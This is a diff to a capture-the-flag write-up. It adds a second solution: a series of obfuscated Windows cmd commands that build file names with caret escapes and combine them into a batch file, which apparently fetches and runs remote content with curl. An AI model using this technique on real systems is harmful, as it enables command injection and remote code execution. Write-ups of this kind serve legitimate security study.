@@ -98,7 +98,38 @@ system("C:\\getflag.exe I rea11y wan7 t0 get 7h3 f1ag plz!");
 ?>
 ```
 
-There should be other creative solutions but sadly I don't see any in this domestic CTF.
+Another solution by @shw:
+
+```
+.>cur^^
+.>l^^
+dir/b>@
+del c*
+del l*
+.>^ -^^
+.>o^ ^^
+.>p^ ^^
+.>qq1^^
+.>r.t^^
+.>w
+ren @ [
+dir/b>z
+copy[+z
+.>b.bat
+del *-*
+del o^*
+del p^*
+del q^*
+del r^*
+del w
+del z
+copy.+[
+b.>b.bat
+ren p [
+del p
+copy.+[
+b
+```
 
 ## Postscript
 
